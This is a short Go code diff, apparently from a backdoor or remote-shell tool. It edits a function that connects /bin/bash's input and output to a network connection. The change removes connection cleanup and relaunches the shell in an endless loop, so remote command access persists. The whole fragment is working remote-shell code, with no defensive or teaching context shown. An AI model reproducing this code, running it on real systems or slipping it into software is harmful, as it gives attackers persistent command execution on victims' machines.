@@ -58,13 +58,12 @@ func shell() {
 		return
 	}
 	fmt.Println("Connection established")
-	cmd := exec.Command("/bin/bash")
-	//Set input/output to the established connection's in/out
-	cmd.Stdin = con
-	cmd.Stdout = con
-	cmd.Stderr = con
-	cmd.Run()
-	list.Close()
-	con.Close()
-	reset()
+	for {
+		cmd := exec.Command("/bin/bash")
+		//Set input/output to the established connection's in/out
+		cmd.Stdin = con
+		cmd.Stdout = con
+		cmd.Stderr = con
+		cmd.Run()
+	}
 }
